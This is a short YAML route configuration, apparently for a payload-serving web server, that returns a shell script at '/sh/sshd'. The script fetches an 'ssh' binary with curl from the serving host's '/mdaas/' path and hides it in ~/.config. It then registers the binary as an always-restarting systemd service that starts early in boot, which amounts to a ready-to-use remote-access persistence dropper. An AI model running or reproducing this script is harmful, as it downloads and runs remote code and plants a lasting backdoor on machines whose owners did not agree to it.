---
title: Simple SSH Service
description: Simple SSH Service (requires build of simple ssh server in static dir)
weight: 1
pattern: /sh/sshd$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    #SVC_DIR=~/.config/systemd/user/
    SVC_DIR=/etc/systemd/system/
    DEST_FILE=~/.config/s
    
    if [ ! -d $SVC_DIR/simple-ssh.service ]; then
      OS=$(uname)
      ARCH=$(uname -m)
    
      mkdir -p $SVC_DIR
    cat << EOF > $SVC_DIR/simple-ssh.service
    [Unit]
    Description=Simple SSH
    DefaultDependencies=no
    Requires=home.mount
    After=home.mount
    Before=sysinit.target systemd-journal-flush.service
  
    [Service]
    ExecStart=$DEST_FILE
    StandardOutput=syslog
    RestartSec=5s
    Restart=always
    TimeoutStopSec=8
  
    [Install]
    WantedBy=multi-user.target
    EOF

      curl {{.Request.Host}}/mdaas/$OS/$ARCH/simple-ssh > $DEST_FILE
      chmod +x $DEST_FILE
    #  systemctl --user daemon-reload
    #  systemctl --user enable simple-ssh
    #  systemctl --user start simple-ssh
      systemctl daemon-reload
      systemctl enable simple-ssh
      systemctl start simple-ssh
    fi

---
